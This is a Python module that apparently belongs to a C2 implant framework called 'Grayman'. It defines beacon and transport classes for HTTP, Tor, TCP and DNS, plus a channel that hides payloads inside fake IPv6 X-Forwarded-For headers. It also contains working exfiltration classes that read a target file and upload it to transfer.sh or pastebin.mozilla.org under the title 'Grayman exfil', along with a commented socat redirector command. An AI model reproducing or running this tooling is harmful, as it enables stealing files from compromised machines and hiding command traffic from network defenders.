from dataclasses import dataclass
from abc import ABC
from email.header import Header
from pathlib import Path
from sqlite3 import Timestamp
from uuid import uuid4
import requests
import socket
# from vendor.torpy.http.requests import tor_requests_session

from rich import print
from helpers import debug, fake_ipv6, unfake_ipv6, unwrap_dict, verbose, wrap_dict

COMMON_USER_AGENT = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36'

# simple tcp redirector
# sudo socat -v TCP-LISTEN:443,fork,reuseaddr TCP:1.2.3.4:1337 

@dataclass
class Payload:
    payload: bytes = b""

    def to_json(self):
        ...

    def to_dict(self):
        ...

    def to_raw(self):
        return self.payload


@dataclass
class C2Task:
    timestamp: int
    cmd: str
    callback_freq: float
    jobid: str

    def __str__(self):
        return f"{self.__dict__}"


@dataclass
class C2Response:
    payload: str = ""
    implant_id: str = ""

    def __str__(self):
        return f"{self.__dict__}"


@dataclass
class Beacon(ABC):
    def beacon(self, payload):
        ...

@dataclass
class HTTPBeacon(Beacon):
    server: str
    endpoint: str

    def beacon(self, payload: bytes):
        verbose(f"beaconing via dns to {self.server}{self.endpoint}")


class DNSBeacon(Beacon):
    server: str

    def beacon(self, payload: bytes):
        verbose(f"beaconing via dns to {self.server}")


@dataclass
class Transport(ABC):
    """C2 transport base class"""

    def send(self, payload: bytes):
        ...

    def recv(self, payload: bytes):
        ...


@dataclass
class ExfilTransport:
    """transport mechanism for Exfil"""

    def send(self, file: Path):
        ...

@dataclass
class TransfershExfil(ExfilTransport):
    url:str = "https://transfer.sh"
    def send(self, file:Path):
        file = Path(f'{file}')
        with open(file.absolute(), "rb") as f:
            package = {"filename": f"{file.absolute()}", "contents": f.read().decode()}
        
        
        wrapped_package = wrap_dict(package).decode()
        del package


        files = {'file': (f'{file.name}', wrapped_package )}
        resp = requests.post(f'{self.url}', files=files)

        pickup_url = resp.text

        return pickup_url



@dataclass
class MozillaPasteExfil(ExfilTransport):
    base_url = "https://pastebin.mozilla.org"
    user_agent: str = COMMON_USER_AGENT

    def __init__(self,expires=604800):
        self.sess = requests.Session()
        resp = self.sess.get(self.base_url)
        # print(resp.url, resp.headers)
        self.csrfmiddlewaretoken = resp.text[resp.text.index("csrfmiddlewaretoken") :].split(" ")[1][7:-3]
        self.expires = expires # 604800 is one week. 

    def send(self, file: Path):
        file = Path(f'{file}')
        with open(file.absolute(), "rb") as f:
            package = {"filename": f"{file.absolute()}", "contents": f.read().decode()}

        wrapped_package = wrap_dict(package).decode()
        del package
        # headers = {"Referer": self.base_url, "User-Agent": self.user_agent}
        headers = {"Referer": self.base_url}
        self.sess.headers.update(headers)
        # print(wrapped_package)
        resp = self.sess.post(
            self.base_url,
            data={
                "csrfmiddlewaretoken": self.csrfmiddlewaretoken,
                "title": "Grayman exfil",
                "lexer": "python",
                "expires": self.expires,
                "content": wrapped_package,
            },
            # headers=headers,
            # cookies={
            #     "csrftoken": self.csrfmiddlewaretoken
            # },
            allow_redirects=False
        )
        print(f'{self.base_url}{resp.headers.get("location")}')

        print(resp.text)
        print(resp.links)
        # print(resp.request.headers)
        # print(resp.headers)
        # print()
        # print(resp.reason, resp.raw.geturl(), resp.raw.get_redirect_location(), resp.url)
        pickup_url = resp.url
        
        self.sess.close()
        return pickup_url


@dataclass
class TORHTTPTransport(Transport):
    """Class for http/s based c2 channel over TOR network:
    server can be a .onion addr or clearnet
    """

    server: str
    proxies: tuple = tuple()
    endpoint: str = "/"
    send_method: str = "post"
    recv_method: str = "get"
    good_status_code = "200"
    user_agent: str = COMMON_USER_AGENT

    # Mozilla/5.0 (Macintosh; Intel Mac OS X 12_2_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36
    # Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36
    # https://www.whatismybrowser.com/guides/the-latest-user-agent/

    def send(self, data: bytes, **kwargs):
        """This is how we send data via the transport: HTTP"""
        verbose(f"sending {data} via http transport on {self.server}{self.endpoint}")
        headers = {"User-Agent": self.user_agent}

        package = {
            "payload": data,
            "implant_id": kwargs.get("implant_id", ""),
            "jobid": kwargs.get("jobid", ""),
        }
        payload = wrap_dict(package)

        with tor_requests_session() as sess:  # returns requests.Session() object
            res = sess.post(
                self.server,
                headers=headers,
                proxies=kwargs.get("proxies", []),
                data=payload,
            )

        return res

    def recv(self) -> dict:
        verbose(f"recieving via http transport on {self.server}{self.endpoint}")
        headers = {"User-Agent": self.user_agent}
        try:
            with tor_requests_session() as sess:  # returns requests.Session() object
                resp = sess.get(self.server, headers=headers)

            debug(f'got wrapped "{resp.text}"')
            data = unwrap_dict(resp.text)
            verbose("unwrapped", data)

            return data
        except requests.exceptions.ConnectionError as e:
            verbose(e)
        except BaseException as e:
            debug(e)


@dataclass
class HTTPTransport(Transport):
    """Class for http/s based c2 channel
    Meant for burnable short-haul comms or bandwidth-heavy activity
    """

    server: str
    proxies: tuple = tuple()
    endpoint: str = "/"
    send_method: str = "post"
    recv_method: str = "get"
    good_status_code = "200"
    user_agent: str = COMMON_USER_AGENT

    # Mozilla/5.0 (Macintosh; Intel Mac OS X 12_2_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36
    # Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36
    # https://www.whatismybrowser.com/guides/the-latest-user-agent/

    def send(self, data: bytes, **kwargs):
        """This is how we send data via the transport: HTTP"""
        verbose(f"sending {data} via http transport on {self.server}{self.endpoint}")
        headers = {"User-Agent": self.user_agent}

        package = {
            "payload": data,
            "implant_id": kwargs.get("implant_id", ""),
            "jobid": kwargs.get("jobid", ""),
        }
        payload = wrap_dict(package)

        return requests.post(
            self.server,
            headers=headers,
            proxies=kwargs.get("proxies", []),
            data=payload,
        )

    def recv(self) -> dict:
        verbose(f"recieving via http transport on {self.server}{self.endpoint}")
        headers = {"User-Agent": self.user_agent}
        try:
            resp = requests.get(self.server, headers=headers)

            debug(f'got wrapped "{resp.text}"')
            data = unwrap_dict(resp.text)
            verbose("unwrapped", data)

            return data
        except requests.exceptions.ConnectionError as e:
            verbose(e)
        except BaseException as e:
            debug(e)


@dataclass
class HTTPHeaderTransport(Transport):
    """Class for http/s based c2 channel using fake IPv6 X-Forward-For headers
    More useful for beacons maybe? large headers would be suspect...

    Try to keep the whole payload/response under 4K because it will be doubled via the hexlification.
    https://www.tutorialspoint.com/What-is-the-maximum-size-of-HTTP-header-values
    """

    server: str
    proxies: tuple = tuple()
    endpoint: str = "/"
    send_method: str = "get"
    recv_method: str = "get"
    good_status_code: str = "404"
    header_name: str = "X-Forwarded-For"
    user_agent: str = COMMON_USER_AGENT

    # Mozilla/5.0 (Macintosh; Intel Mac OS X 12_2_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36
    # Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36
    # https://www.whatismybrowser.com/guides/the-latest-user-agent/

    def send(self, data: str, **kwargs):
        """This is how we send data via the transport: HTTP-Header"""
        verbose(
            f"sending {data} via http header {self.header_name} transport on {self.server}{self.endpoint}"
        )
        # print(data, type(data), dir(data))

        package = {"payload": data, "implant_id": kwargs.get("implant_id", "")}
        payload = wrap_dict(package)

        headers = {"User-Agent": self.user_agent, self.header_name: fake_ipv6(payload)}

        # return requests.post(
        #     self.server,
        #     headers=headers,
        #     proxies=kwargs.get("proxies", []),
        #     data=request_payload,
        # )
        try:
            return requests.get(
                self.server,
                headers=headers,
                proxies=kwargs.get("proxies", []),
            )
        except IndexError as e:
            debug(e)

    def recv(self) -> dict:
        """this is how the implant gets info from the server"""
        verbose(
            f"recieving via http header {self.header_name} transport on {self.server}{self.endpoint}"
        )
        headers = {"User-Agent": self.user_agent}
        try:
            resp = requests.get(self.server, headers=headers)

            debug(
                f'got wrapped via headers {self.header_name}: "{resp.headers.get(self.header_name)}"'
            )

            addy_list = resp.headers.get(self.header_name, "")
            wrapped_dict = unfake_ipv6(addy_list)

            data = unwrap_dict(wrapped_dict)
            verbose("unwrapped", data)

            return data
        except requests.exceptions.ConnectionError as e:
            verbose(e)
        # except BaseException as e:
        #     debug(e)


@dataclass
class DNSTransport(Transport):
    """Class for dns based c2 channel"""

    domain: str
    tx_record_type: str = "A"
    rx_record_type: str = "A"

    def send(self, data: bytes, **kwargs):
        """This is how we send data via the transport: DNS"""
        verbose(f"sending {data} via DNS {self.tx_record_type} record on {self.domain}")
        raise NotImplemented

    def recv(self) -> dict:
        verbose(f"recieving via DNS {self.tx_record_type} record on {self.domain}")
        raise NotImplemented

@dataclass
class TCPTransport(Transport):
    """Class for TCP based c2 channel; I think of this as mostly an egress transport..."""

    server: str

    def __init__(self, server: str):
        t = server.split(":")
        self.host = t[0]
        self.port = int(t[1])

        # self.sock.settimeout(30.0)

    def send(self, data: bytes, **kwargs):
        """This is how we send data via the transport: TCP"""
        verbose(f"sending {data} via TCP {self.host} port {self.port}")

        package = {"payload": data, "implant_id": kwargs.get("implant_id", "")}
        payload = wrap_dict(package)

        try:
            sock = socket.socket()
            sock.connect((self.host, self.port))
            sock.send(payload.encode())
            sock.close()
        except BaseException as e:
            print(e)
        # raise NotImplemented

    def recv(self) -> dict:
        # It doesn't make sense to recv data via tcp by randomly selecting the transport channels...
        verbose(f"recieving via TCP {self.host} port {self.port}")

        # try:
        #     # get the package
        #     wrapped_dict = self.sock.recv(1024)
        #     # unwrap it
        #     data = unwrap_dict(wrapped_dict)
        #     # hand it to implant
        #     return data

        # except socket.timeout as e:
        #     verbose("socket timed out... do we reconnect?", e)
        # except BaseException as e:
        #     verbose(e)

        raise NotImplementedError


def paste_exfil_test():
    # pe = CentosPasteExfil()
    pe = MozillaPasteExfil()
    print(pe.send(Path("/tmp/target_file.txt")))

def transfer_test():
    tse = TransfershExfil()
    print(tse.send(Path("/tmp/target_file.txt")))


if __name__ == "__main__":
    # paste_exfil_test()
    transfer_test()
    
